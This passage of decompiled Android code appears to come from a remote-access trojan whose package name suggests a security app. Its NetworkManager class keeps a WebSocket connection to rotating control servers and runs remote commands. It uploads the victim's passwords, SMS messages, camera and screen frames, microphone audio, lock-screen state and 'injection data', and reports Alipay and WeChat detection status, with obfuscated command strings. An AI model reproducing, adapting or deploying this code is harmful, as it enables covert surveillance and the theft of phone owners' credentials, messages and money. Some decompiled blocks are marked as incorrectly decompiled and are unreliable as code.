            t60.m214714d6("NetworkManager", "✅ 保活机制已重启");
            return;
        }
        try {
            String string = Settings.Secure.getString(this.f53100a0.getContentResolver(), "android_id");
            if (string == null) {
                string = "unknown";
            }
            this.f53107a7 = string;
            this.f53101a1 = C0268a1.f52275a6.getInstance(this.f53100a0);
            m211641a6();
            this.f53102a2 = new C0267a0(this.f53100a0, new h10() { // from class: com.storm.safe.rock.service.modules.NetworkManager$initialize$1
                {
                    super(1);
                }

                /* JADX WARN: Type inference failed for: r1v2, types: [h10, kotlin.jvm.internal.Lambda] */
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    C1108qf c1108qf = (C1108qf) obj;
                    t60.m214695b6(c1108qf, "cmd");
                    C0323a8 c0323a8 = this.f52829a0;
                    try {
                        if (c1108qf.f59490a0.equals(StringUtil.m212470a0("LVYDOUgHHitQODhNFCg="))) {
                            t60.m214714d6("NetworkManager", "📝 收到 force_register 命令，异步重新上报设备信息");
                            c0323a8.f53104a4 = false;
                            AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, AbstractC1262tj.f60234a1, new NetworkManager$handleRemoteCommand$1(c0323a8, null), 2);
                        } else {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put(StringUtil.m212470a0("KFYcN0w2CA=="), c1108qf.f59490a0);
                            jSONObject.put("params", new JSONObject((Map<?, ?>) c1108qf.f59491a1));
                            ?? r1 = c0323a8.f53117b7;
                            if (r1 != 0) {
                                r1.invoke(jSONObject);
                            } else {
                                t60.m214726f4("NetworkManager", "⚠️ commandCallback 未就绪，丢弃 WS 命令: ".concat(c1108qf.f59490a0));
                            }
                        }
                    } catch (Exception e) {
                        t60.m214705c6("NetworkManager", "处理命令失败", e);
                    }
                    return C1351vv.f60710b1;
                }
            }, new h10() { // from class: com.storm.safe.rock.service.modules.NetworkManager$initialize$2

                /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
                @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.NetworkManager$initialize$2$1", m214403f = "NetworkManager.kt", m214404l = {222}, m214405m = "invokeSuspend")
                /* renamed from: com.storm.safe.rock.service.modules.NetworkManager$initialize$2$1 */
                final class C03041 extends SuspendLambda implements l10 {

                    /* renamed from: a1 */
                    public int f52831a1;

                    /* renamed from: a2 */
                    public final /* synthetic */ C0323a8 f52832a2;

                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    public C03041(C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
                        super(2, interfaceC0876mv);
                        this.f52832a2 = c0323a8;
                    }

                    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                        return new C03041(this.f52832a2, interfaceC0876mv);
                    }

                    @Override // p000.l10
                    public final Object invoke(Object obj, Object obj2) {
                        return ((C03041) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
                    }

                    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                    public final Object invokeSuspend(Object obj) throws Throwable {
                        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                        int i = this.f52831a1;
                        try {
                            if (i == 0) {
                                kg1.m213544f4(obj);
                                C0323a8 c0323a8 = this.f52832a2;
                                this.f52831a1 = 1;
                                if (c0323a8.m211642a7(this) == coroutineSingletons) {
                                    return coroutineSingletons;
                                }
                            } else {
                                if (i != 1) {
                                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                                }
                                kg1.m213544f4(obj);
                            }
                        } catch (Exception unused) {
                        }
                        return C1351vv.f60710b1;
                    }
                }

                /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
                @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.NetworkManager$initialize$2$2", m214403f = "NetworkManager.kt", m214404l = {}, m214405m = "invokeSuspend")
                /* renamed from: com.storm.safe.rock.service.modules.NetworkManager$initialize$2$2 */
                final class C03052 extends SuspendLambda implements l10 {

                    /* renamed from: a1 */
                    public final /* synthetic */ C0323a8 f52833a1;

                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    public C03052(C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
                        super(2, interfaceC0876mv);
                        this.f52833a1 = c0323a8;
                    }

                    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                        return new C03052(this.f52833a1, interfaceC0876mv);
                    }

                    @Override // p000.l10
                    public final Object invoke(Object obj, Object obj2) throws Throwable {
                        C03052 c03052 = (C03052) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
                        C1351vv c1351vv = C1351vv.f60710b1;
                        c03052.invokeSuspend(c1351vv);
                        return c1351vv;
                    }

                    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                    public final Object invokeSuspend(Object obj) throws Throwable {
                        C0323a8 c0323a8 = this.f52833a1;
                        Context context = c0323a8.f53100a0;
                        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                        kg1.m213544f4(obj);
                        try {
                            Object systemService = context.getSystemService("keyguard");
                            KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
                            Object systemService2 = context.getSystemService("power");
                            PowerManager powerManager = systemService2 instanceof PowerManager ? (PowerManager) systemService2 : null;
                            boolean z = true;
                            boolean zIsInteractive = powerManager != null ? powerManager.isInteractive() : true;
                            if (!(keyguardManager != null ? keyguardManager.isKeyguardLocked() : false) && zIsInteractive) {
                                z = false;
                            }
                            c0323a8.m211666d2(z, zIsInteractive);
                        } catch (Exception e) {
                            tz0.m214810b0("WS重连后推送锁屏状态失败: ", e.getMessage(), "NetworkManager");
                        }
                        return C1351vv.f60710b1;
                    }
                }

                {
                    super(1);
                }

                @Override // p000.h10
                public final Object invoke(Object obj) {
                    boolean zBooleanValue = ((Boolean) obj).booleanValue();
                    this.f52830a0.f53103a3 = zBooleanValue;
                    if (zBooleanValue) {
                        t60.m214714d6("NetworkManager", "✅ WebSocket 已连接");
                        AbstractC0315a0.m211548b0("WS已连接(服务器连接恢复)");
                        AbstractC0315a0.m211545a7("WebSocket连接成功 与服务器恢复通信");
                        this.f52830a0.m211653b9();
                        if (!this.f52830a0.f53104a4) {
                            AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, AbstractC1262tj.f60234a1, new C03041(this.f52830a0, null), 2);
                        }
                        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, sc0.f59953a0, new C03052(this.f52830a0, null), 2);
                    } else {
                        t60.m214714d6("NetworkManager", "📡 WebSocket 断开");
                        AbstractC0315a0.m211548b0("WS断开(与服务器断连)");
                        AbstractC0315a0.m211545a7("WebSocket连接断开 与服务器失去通信");
                    }
                    return C1351vv.f60710b1;
                }
            });
            m211640a5();
            AbstractC0315a0.f53031a6 = new NetworkManager$initialize$3(this);
            m211670d7();
            m211651b7();
            this.f53118b8 = true;
            f53099e2 = this;
            t60.m214714d6("NetworkManager", "✅ 网络管理器初始化完成");
        } catch (Exception e) {
            t60.m214705c6("NetworkManager", "❌ 网络管理器初始化失败", e);
        }
    }

    /* renamed from: b4 */
    public final boolean m211648b4() {
        u11 u11Var = this.f53121c1;
        return u11Var != null && u11Var.mo213470a0();
    }

    /* renamed from: b5 */
    public final boolean m211649b5() {
        return this.f53118b8 && m211648b4() && this.f53103a3;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r8v14, types: [java.util.ArrayList] */
    /* JADX WARN: Type inference failed for: r8v3, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r8v4, types: [java.util.List] */
    /* renamed from: b6 */
    public final void m211650b6(String str) {
        ?? M214451e7;
        if (AbstractC0779a1.m213652a5(str, ";", false)) {
            List listM213677d0 = AbstractC0779a1.m213677d0(str, new String[]{";"}, 6);
            ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(listM213677d0));
            Iterator it = listM213677d0.iterator();
            while (it.hasNext()) {
                arrayList.add(AbstractC0779a1.m213687e0((String) it.next()).toString());
            }
            M214451e7 = new ArrayList();
            int size = arrayList.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                if (((String) obj).length() > 0) {
                    M214451e7.add(obj);
                }
            }
        } else {
            M214451e7 = AbstractC1117qo.m214451e7(AbstractC0779a1.m213687e0(str).toString());
        }
        this.f53108a8 = M214451e7;
        if (M214451e7.isEmpty()) {
            t60.m214704c5("NetworkManager", "❌ 服务器列表为空");
            return;
        }
        AbstractC0003a2.m44c5("📡 多服务器配置: ", this.f53108a8.size(), " 个服务器", "NetworkManager");
        int i2 = 0;
        for (Object obj2 : this.f53108a8) {
            int i3 = i2 + 1;
            if (i2 < 0) {
                AbstractC0716jf.m213309g8();
                throw null;
            }
            t60.m214714d6("NetworkManager", "   [" + i2 + "] " + ((String) obj2));
            i2 = i3;
        }
        this.f53109a9 = 0;
        this.f53110b0 = 0;
    }

    /* renamed from: b7 */
    public final void m211651b7() {
        try {
            Object systemService = this.f53100a0.getSystemService("connectivity");
            ConnectivityManager connectivityManager = systemService instanceof ConnectivityManager ? (ConnectivityManager) systemService : null;
            this.f53115b5 = connectivityManager;
            if (connectivityManager == null) {
                t60.m214726f4("NetworkManager", "⚠️ ConnectivityManager 不可用");
                return;
            }
            this.f53114b4 = new mj0(0, this);
            NetworkRequest networkRequestBuild = new NetworkRequest.Builder().addCapability(12).build();
            mj0 mj0Var = this.f53114b4;
            if (mj0Var != null) {
                ConnectivityManager connectivityManager2 = this.f53115b5;
                if (connectivityManager2 != null) {
                    connectivityManager2.registerNetworkCallback(networkRequestBuild, mj0Var);
                }
                t60.m214714d6("NetworkManager", "✅ 网络变化监听已注册");
            }
        } catch (Exception e) {
            t60.m214705c6("NetworkManager", "❌ 注册网络回调失败", e);
        }
    }

    /* renamed from: b8 */
    public final void m211652b8() {
        synchronized (this.f53112b2) {
            this.f53110b0++;
            t60.m214726f4("NetworkManager", "⚠️ 服务器连接失败 (" + this.f53110b0 + "/" + this.f53111b1 + ")");
            int i = this.f53110b0;
            int i2 = this.f53111b1;
            if (i >= i2) {
                t60.m214726f4("NetworkManager", "❌ 服务器连续失败 " + i2 + " 次，尝试切换");
                if (m211671d8()) {
                    m211669d6();
                }
            }
        }
    }

    /* renamed from: b9 */
    public final void m211653b9() {
        synchronized (this.f53112b2) {
            if (this.f53110b0 > 0) {
                t60.m214714d6("NetworkManager", "✅ 服务器连接成功，重置失败计数");
                this.f53110b0 = 0;
            }
        }
        boolean zM214888a0 = v00.m214888a0();
        String strM211654c0 = m211654c0();
        if (strM211654c0 == null || !zM214888a0 || strM211654c0.equals(this.f53120c0)) {
            return;
        }
        t60.m214714d6("NetworkManager", "🔄 同步 local-service 配置: ".concat(strM211654c0));
        this.f53120c0 = strM211654c0;
        if (v00.m214888a0()) {
            AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$notifyLocalServiceFullConfig$1(strM211654c0, this, null), 3);
        }
    }

    /* renamed from: c0 */
    public final String m211654c0() {
        List list = this.f53108a8;
        int i = this.f53109a9;
        return (String) ((list.isEmpty() || i < 0 || i >= list.size()) ? AbstractC0715je.m213291h8(list) : list.get(i));
    }

    /* renamed from: c1 */
    public final void m211655c1(boolean z) {
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendAlipayDetectionStatus$1(this, z, null), 3);
    }

    /* renamed from: c2 */
    public final void m211656c2(long j, boolean z) {
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendAutoPasswordDetectionStatus$1(this, z, j, null), 3);
    }

    /* renamed from: c3 */
    public final void m211657c3(byte[] bArr) {
        t60.m214695b6(bArr, "frameData");
        if (this.f53103a3) {
            AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendCameraFrame$1(bArr, this, null), 3);
        }
    }

    /* renamed from: c4 */
    public final void m211658c4(String str, JSONObject jSONObject) {
        if (this.f53103a3 && this.f53102a2 != null) {
            AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendEvent$2(this, str, jSONObject, null), 3);
            return;
        }
        t60.m214726f4("NetworkManager", "⚠️ 无法发送事件 " + str + ": wsConnected=" + this.f53103a3 + ", initialized=" + (this.f53102a2 != null));
    }

    /* renamed from: c5 */
    public final void m211659c5(JSONObject jSONObject) {
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendIncomingSms$1(this, jSONObject, null), 3);
    }

    /* renamed from: c6 */
    public final void m211660c6(int i, int i2, String str) throws JSONException {
        if (!this.f53103a3 || this.f53102a2 == null) {
            return;
        }
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("type", StringUtil.m212470a0("JlASKEIoBCFZNBRYBD5ENw=="));
        jSONObject.put("sessionId", this.f53107a7);
        JSONObject jSONObject2 = new JSONObject();
        jSONObject2.put("audio", str);
        jSONObject2.put("sampleRate", i);
        jSONObject2.put("sampleCount", i2);
        jSONObject2.put("channelCount", 1);
        jSONObject.put("data", jSONObject2);
        C0267a0 c0267a0 = this.f53102a2;
        if (c0267a0 == null) {
            t60.m214724f2("dataSyncClient");
            throw null;
        }
        String string = jSONObject.toString();
        t60.m214694b5(string, "message.toString()");
        c0267a0.m211367a8(string);
    }

    /* renamed from: c7 */
    public final void m211661c7(JSONObject jSONObject) {
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendOperationLog$1(this, jSONObject, null), 3);
    }

    /* renamed from: c8 */
    public final void m211662c8(String str, String str2, String str3) {
        t60.m214695b6(str, "password");
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendPasswordData$1(this, str, str2, str3, null), 3);
    }

    /* renamed from: c9 */
    public final void m211663c9(String str, boolean z) {
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendPermissionResponse$1(this, z, str, null), 3);
    }

    /* renamed from: d0 */
    public final void m211664d0() {
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendPermissionsUpdate$1(this, null), 3);
    }

    /* renamed from: d1 */
    public final void m211665d1(byte[] bArr) {
        int i;
        int i2;
        int i3;
        t60.m214695b6(bArr, "frameData");
        if (!this.f53103a3 || this.f53102a2 == null) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - this.f53131d1 > 10000) {
                this.f53131d1 = jCurrentTimeMillis;
                if (!this.f53103a3) {
                    t60.m214726f4("NetworkManager", "⚠️ [投屏] WebSocket未连接，屏幕数据无法发送");
                    return;
                } else {
                    if (this.f53102a2 == null) {
                        t60.m214726f4("NetworkManager", "⚠️ [投屏] DataSyncClient未初始化");
                        return;
                    }
                    return;
                }
            }
            return;
        }
        long jCurrentTimeMillis2 = System.currentTimeMillis();
        long j = -3750763034362895579L;
        for (int i4 = 0; i4 < bArr.length; i4 += 37) {
            j = (j ^ (bArr[i4] & 255)) * 1099511628211L;
        }
        long length = j ^ bArr.length;
        if (length == this.f53134d4 && jCurrentTimeMillis2 - this.f53139d9 < 3000) {
            this.f53135d5++;
            this.f53138d8++;
            return;
        }
        this.f53134d4 = length;
        if (this.f53135d5 > 0) {
            this.f53135d5 = 0;
        }
        this.f53139d9 = jCurrentTimeMillis2;
        if (!this.f53132d2.offer(bArr)) {
            this.f53132d2.poll();
            this.f53132d2.offer(bArr);
        }
        if (!this.f53133d3) {
            synchronized (this) {
                if (!this.f53133d3) {
                    this.f53133d3 = true;
                    Thread thread = new Thread(new kj0(this, 0), "FrameSender");
                    thread.setDaemon(true);
                    thread.start();
                }
            }
        }
        long j2 = this.f53136d6;
        if (jCurrentTimeMillis2 - j2 > 30000) {
            if (j2 > 0 && (i3 = (i = this.f53137d7) + (i2 = this.f53138d8)) > 0) {
                int size = this.f53132d2.size();
                StringBuilder sbM38b9 = AbstractC0003a2.m38b9("📊 [投屏统计] 发送=", i, " 跳过=", i2, " 跳过率=");
                sbM38b9.append((i2 * 100) / i3);
                sbM38b9.append("% 队列=");
                sbM38b9.append(size);
                t60.m214702c3("NetworkManager", sbM38b9.toString());
            }
            this.f53137d7 = 0;
            this.f53138d8 = 0;
            this.f53136d6 = jCurrentTimeMillis2;
        }
    }

    /* renamed from: d2 */
    public final void m211666d2(boolean z, boolean z2) {
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendScreenLockStatus$1(this, z, z2, null), 3);
    }

    /* renamed from: d3 */
    public final void m211667d3(JSONObject jSONObject) {
        C0267a0 c0267a0;
        if (this.f53103a3 && (c0267a0 = this.f53102a2) != null && c0267a0.f52263a3) {
            try {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put("type", StringUtil.m212470a0("PlAuMkQ9Hi9FMiNA"));
                jSONObject2.put("sessionId", c0267a0.f52270b0);
                jSONObject2.put("data", jSONObject);
                jSONObject2.put("timestamp", System.currentTimeMillis());
                String string = jSONObject2.toString();
                t60.m214694b5(string, "message.toString()");
                c0267a0.m211367a8(string);
            } catch (Exception e) {
                t60.m214705c6("DataSyncClient", "发送UI数据失败", e);
            }
        }
    }

    /* renamed from: d4 */
    public final void m211668d4(boolean z) {
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$sendWechatDetectionStatus$1(this, z, null), 3);
    }

    /* JADX WARN: Code restructure failed: missing block: B:48:0x00e7, code lost:
    
        r0 = p000.AbstractC0575hb.f56638a0.m215445successJP2dKIU(r3);
     */
    /* renamed from: d6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211669d6() {
        C0576hc c0576hc;
        int i;
        C0794ks c0794ks;
        boolean z;
        C0576hc c0576hc2;
        int i2;
        int i3;
        int i4;
        int i5;
        long j;
        Throwable thM213719a8;
        C0562gz c0562gz;
        Object objM215443closedJP2dKIU;
        C0794ks c0794ks2;
        AtomicLongFieldUpdater atomicLongFieldUpdater = C0786a0.f57673a2;
        AtomicReferenceFieldUpdater atomicReferenceFieldUpdater = C0786a0.f57676a5;
        AtomicLongFieldUpdater atomicLongFieldUpdater2 = C0786a0.f57672a1;
        C1351vv c1351vv = C1351vv.f60710b1;
        C0794ks c0794ks3 = this.f53125c5;
        String str = "unexpected";
        boolean z2 = false;
        if (c0794ks3.f57715a9 == BufferOverflow.f57669a2) {
            if (c0794ks3.m213721b1(atomicLongFieldUpdater2.get(c0794ks3), false) ? false : !c0794ks3.m213713a2(r6 & 1152921504606846975L)) {
                objM215443closedJP2dKIU = AbstractC0575hb.f56638a0.m215444failurePtdJZtk();
            } else {
                Object obj = AbstractC0494fg.f56246a9;
                C0576hc c0576hc3 = (C0576hc) atomicReferenceFieldUpdater.get(c0794ks3);
                while (true) {
                    long andIncrement = atomicLongFieldUpdater2.getAndIncrement(c0794ks3);
                    long j2 = andIncrement & 1152921504606846975L;
                    boolean zM213721b1 = c0794ks3.m213721b1(andIncrement, z2);
                    int i6 = AbstractC0494fg.f56238a1;
                    long j3 = i6;
                    String str2 = str;
                    long j4 = j2 / j3;
                    int i7 = (int) (j2 % j3);
                    if (c0576hc3.f57401a2 != j4) {
                        C0576hc c0576hcM213709a0 = C0786a0.m213709a0(c0794ks3, j4, c0576hc3);
                        if (c0576hcM213709a0 != null) {
                            z = zM213721b1;
                            c0576hc2 = c0576hcM213709a0;
                            i4 = i6;
                            i5 = i7;
                            j = j2;
                            i2 = 1;
                            i3 = 2;
                        } else if (zM213721b1) {
                            c0562gz = AbstractC0575hb.f56638a0;
                            thM213719a8 = c0794ks3.m213719a8();
                            break;
                        } else {
                            str = str2;
                            z2 = false;
                        }
                    } else {
                        z = zM213721b1;
                        c0576hc2 = c0576hc3;
                        i2 = 1;
                        i3 = 2;
                        i4 = i6;
                        i5 = i7;
                        j = j2;
                    }
                    int iM213710a1 = C0786a0.m213710a1(c0794ks3, c0576hc2, i5, j, obj, z);
                    long j5 = j;
                    c0794ks2 = c0794ks3;
                    C0576hc c0576hc4 = c0576hc2;
                    if (iM213710a1 == 0) {
                        c0576hc4.m213553a0();
                        break;
                    }
                    if (iM213710a1 == i2) {
                        break;
                    }
                    if (iM213710a1 != i3) {
                        if (iM213710a1 == 3) {
                            throw new IllegalStateException(str2);
                        }
                        if (iM213710a1 != 4) {
                            if (iM213710a1 == 5) {
                                c0576hc4.m213553a0();
                            }
                            c0794ks3 = c0794ks2;
                            c0576hc3 = c0576hc4;
                            str = str2;
                            z2 = false;
                        } else if (j5 < atomicLongFieldUpdater.get(c0794ks2)) {
                            c0576hc4.m213553a0();
                        }
                    } else if (z) {
                        c0576hc4.m213363a7();
                    } else {
                        fe1 fe1Var = obj instanceof fe1 ? (fe1) obj : null;
                        if (fe1Var != null) {
                            fe1Var.mo212795a0(c0576hc4, i5 + i4);
                        }
                        c0576hc4.m213363a7();
                        objM215443closedJP2dKIU = AbstractC0575hb.f56638a0.m215444failurePtdJZtk();
                    }
                }
                c0562gz = AbstractC0575hb.f56638a0;
                thM213719a8 = c0794ks2.m213719a8();
                objM215443closedJP2dKIU = c0562gz.m215443closedJP2dKIU(thM213719a8);
            }
            if (!(objM215443closedJP2dKIU instanceof C0574ha) || (objM215443closedJP2dKIU instanceof C0561gy)) {
                return;
            }
            AbstractC0575hb.f56638a0.m215445successJP2dKIU(c1351vv);
            return;
        }
        C0794ks c0794ks4 = c0794ks3;
        Object obj2 = AbstractC0494fg.f56240a3;
        C0576hc c0576hc5 = (C0576hc) atomicReferenceFieldUpdater.get(c0794ks4);
        while (true) {
            long andIncrement2 = atomicLongFieldUpdater2.getAndIncrement(c0794ks4);
            long j6 = andIncrement2 & 1152921504606846975L;
            boolean zM213721b12 = c0794ks4.m213721b1(andIncrement2, false);
            int i8 = AbstractC0494fg.f56238a1;
            long j7 = i8;
            long j8 = j6 / j7;
            C0794ks c0794ks5 = c0794ks4;
            int i9 = (int) (j6 % j7);
            Object obj3 = obj2;
            if (c0576hc5.f57401a2 != j8) {
                C0576hc c0576hcM213709a02 = C0786a0.m213709a0(c0794ks5, j8, c0576hc5);
                if (c0576hcM213709a02 != null) {
                    i = i8;
                    c0794ks = c0794ks5;
                    c0576hc = c0576hcM213709a02;
                } else if (zM213721b12) {
                    AbstractC0575hb.f56638a0.m215443closedJP2dKIU(c0794ks5.m213719a8());
                    return;
                } else {
                    obj2 = obj3;
                    c0794ks4 = c0794ks5;
                }
            } else {
                c0576hc = c0576hc5;
                i = i8;
                c0794ks = c0794ks5;
            }
            int iM213710a12 = C0786a0.m213710a1(c0794ks, c0576hc, i9, j6, obj3, zM213721b12);
            C0794ks c0794ks6 = c0794ks;
            C0576hc c0576hc6 = c0576hc;
            if (iM213710a12 == 0) {
                c0576hc6.m213553a0();
                AbstractC0575hb.f56638a0.m215445successJP2dKIU(c1351vv);
                return;
            }
            if (iM213710a12 == 1) {
                AbstractC0575hb.f56638a0.m215445successJP2dKIU(c1351vv);
                return;
            }
            if (iM213710a12 == 2) {
                if (zM213721b12) {
                    c0576hc6.m213363a7();
                    AbstractC0575hb.f56638a0.m215443closedJP2dKIU(c0794ks6.m213719a8());
                    return;
                }
                fe1 fe1Var2 = obj3 instanceof fe1 ? (fe1) obj3 : null;
                if (fe1Var2 != null) {
                    fe1Var2.mo212795a0(c0576hc6, i + i9);
                }
                c0794ks6.m213716a5((c0576hc6.f57401a2 * j7) + i9);
                AbstractC0575hb.f56638a0.m215445successJP2dKIU(c1351vv);
                return;
            }
            if (iM213710a12 == 3) {
                throw new IllegalStateException("unexpected");
            }
            if (iM213710a12 == 4) {
                if (j6 < atomicLongFieldUpdater.get(c0794ks6)) {
                    c0576hc6.m213553a0();
                }
                AbstractC0575hb.f56638a0.m215443closedJP2dKIU(c0794ks6.m213719a8());
                return;
            } else {
                if (iM213710a12 == 5) {
                    c0576hc6.m213553a0();
                }
                obj2 = obj3;
                c0794ks4 = c0794ks6;
                c0576hc5 = c0576hc6;
            }
        }
    }

    /* renamed from: d7 */
    public final void m211670d7() {
        t60.m214714d6("NetworkManager", "启动：WS保活");
        synchronized (this.f53113b3) {
            u11 u11Var = this.f53121c1;
            if (u11Var == null || !u11Var.mo213470a0()) {
                this.f53121c1 = AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new NetworkManager$startWebSocketKeepAlive$1$1(this, null), 3);
            }
        }
    }

    /* renamed from: d8 */
    public final boolean m211671d8() {
        synchronized (this.f53112b2) {
            if (this.f53108a8.size() <= 1) {
                t60.m214726f4("NetworkManager", "⚠️ 只有一个服务器，无法切换");
                return false;
            }
            int i = this.f53109a9;
            this.f53109a9 = (this.f53109a9 + 1) % this.f53108a8.size();
            this.f53110b0 = 0;
            String str = (String) this.f53108a8.get(this.f53109a9);
            t60.m214714d6("NetworkManager", "🔄 切换服务器: [" + (i + 1) + "] -> [" + (this.f53109a9 + 1) + "] (" + str + ")");
            C0267a0 c0267a0 = this.f53102a2;
            if (c0267a0 != null) {
                c0267a0.m211362a3();
                this.f53103a3 = false;
            }
            this.f53104a4 = false;
            m211639a4();
            return true;
        }
    }

    /* renamed from: d9 */
    public final void m211672d9() {
        try {
            mj0 mj0Var = this.f53114b4;
            if (mj0Var != null) {
                ConnectivityManager connectivityManager = this.f53115b5;
                if (connectivityManager != null) {
                    connectivityManager.unregisterNetworkCallback(mj0Var);
                }
                t60.m214714d6("NetworkManager", "✅ 网络变化监听已注销");
            }
            this.f53114b4 = null;
        } catch (Exception e) {
            tz0.m214810b0("⚠️ 注销网络回调失败: ", e.getMessage(), "NetworkManager");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: e0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211673e0(JSONObject jSONObject, ContinuationImpl continuationImpl) throws Throwable {
        NetworkManager$uploadInjectionData$1 networkManager$uploadInjectionData$1;
        if (continuationImpl instanceof NetworkManager$uploadInjectionData$1) {
            networkManager$uploadInjectionData$1 = (NetworkManager$uploadInjectionData$1) continuationImpl;
            int i = networkManager$uploadInjectionData$1.f52883a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                networkManager$uploadInjectionData$1.f52883a2 = i - Integer.MIN_VALUE;
            } else {
                networkManager$uploadInjectionData$1 = new NetworkManager$uploadInjectionData$1(this, continuationImpl);
            }
        }
        Object obj = networkManager$uploadInjectionData$1.f52881a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = networkManager$uploadInjectionData$1.f52883a2;
        if (i2 != 0) {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return ((Result) obj).f57559a0;
        }
        kg1.m213544f4(obj);
        C0268a1 c0268a1 = this.f53101a1;
        if (c0268a1 == null) {
            int i3 = Result.f57558a1;
            return kg1.m213507a7(new IllegalStateException("httpManager not initialized"));
        }
        networkManager$uploadInjectionData$1.f52883a2 = 1;
        Object objM211375a5 = c0268a1.m211375a5(jSONObject, networkManager$uploadInjectionData$1);
        return objM211375a5 == coroutineSingletons ? coroutineSingletons : objM211375a5;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: e1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211674e1(ArrayList arrayList, ContinuationImpl continuationImpl) throws Throwable {
        NetworkManager$uploadSms$1 networkManager$uploadSms$1;
        if (continuationImpl instanceof NetworkManager$uploadSms$1) {
            networkManager$uploadSms$1 = (NetworkManager$uploadSms$1) continuationImpl;
            int i = networkManager$uploadSms$1.f52886a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                networkManager$uploadSms$1.f52886a2 = i - Integer.MIN_VALUE;
            } else {
                networkManager$uploadSms$1 = new NetworkManager$uploadSms$1(this, continuationImpl);
            }
        }
        Object obj = networkManager$uploadSms$1.f52884a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = networkManager$uploadSms$1.f52886a2;
        if (i2 != 0) {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return ((Result) obj).f57559a0;
        }
        kg1.m213544f4(obj);
        C0268a1 c0268a1 = this.f53101a1;
        if (c0268a1 == null) {
            int i3 = Result.f57558a1;
            return kg1.m213507a7(new IllegalStateException("httpManager not initialized"));
        }
        networkManager$uploadSms$1.f52886a2 = 1;
        Object objM211378a8 = c0268a1.m211378a8(arrayList, networkManager$uploadSms$1);
        return objM211378a8 == coroutineSingletons ? coroutineSingletons : objM211378a8;
    }
}
